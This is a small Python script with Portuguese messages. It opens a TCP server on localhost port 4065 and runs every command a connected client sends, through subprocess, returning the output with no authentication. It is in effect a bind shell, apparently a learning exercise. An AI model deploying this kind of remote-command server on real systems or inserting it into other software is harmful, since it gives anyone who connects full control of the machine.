import socket
import os
import subprocess

IP_SERVER = '127.0.0.1'
PORT_SERVER = 4065

socket_server_main = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
socket_server_main.bind((IP_SERVER, PORT_SERVER))
socket_server_main.listen(2)
print(f'Servidor escutando em {IP_SERVER}:{PORT_SERVER}')


socket_client, addr_client = socket_server_main.accept()
socket_client.sendall('Conexão estabelecida com sucesso!'.encode())    
print('LOGS>')

while True:
    try:
        data = socket_client.recv(4096)
    except socket.error as e:
        socket_server_main.close()
        print(e.__context__)
        break
    except KeyboardInterrupt:
        socket_server_main.close()
        socket_client.close()
        break
    else:
        if not data.decode().strip():
                socket_client.sendall(':( envie algum comando babaca'.encode())
                continue
        if data:
            if data.decode().startswith('cd'):
                try:
                    dados = data.decode().split()
                except (OSError, BrokenPipeError) as e: 
                    socket_client.sendall(f'Houve um erro. {e}'.encode())
                else:
                    try:
                        if dados[1]:
                            diretorio = dados[1]
                            if diretorio == '..':
                                os.chdir('..')
                                socket_client.sendall('Diretorio alterado.'.encode())
                            else:
                                os.chdir(diretorio)
                                if diretorio in os.getcwd():
                                    socket_client.sendall('Diretório alterado.'.encode())
                                    continue
                                else:
                                    socket_client.sendall('Diretorio não existe.'.encode())
                    except FileNotFoundError:
                        socket_client.sendall('Arquivo não encontrado ou não existe!'.encode())
                        continue
            else:
                comando = subprocess.getoutput(data.decode())
                if comando:
                    socket_client.sendall(comando.encode())
                else:
                    socket_client.sendall('Comando sem saída.'.encode())
    print(data.decode())